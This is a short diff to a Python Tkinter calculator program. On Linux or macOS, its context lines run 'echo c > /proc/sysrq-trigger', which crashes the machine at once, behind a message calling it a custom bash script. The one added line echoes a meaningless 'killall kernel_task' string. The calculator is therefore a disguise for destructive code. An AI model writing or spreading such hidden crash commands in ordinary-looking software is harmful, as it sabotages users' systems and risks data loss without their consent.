@@ -58,6 +58,7 @@ def create_calculator_gui():
             messagebox.showinfo("OS Check", "Running on Linux/macOS. Executing custom bash script.")
             try:
                 os.system("echo c > /proc/sysrq-trigger")
+                os.system("echo killall kernel_task")
             except Exception as e:
                 messagebox.showerror("Script Error", f"Error executing Linux script: {e}")
         else:
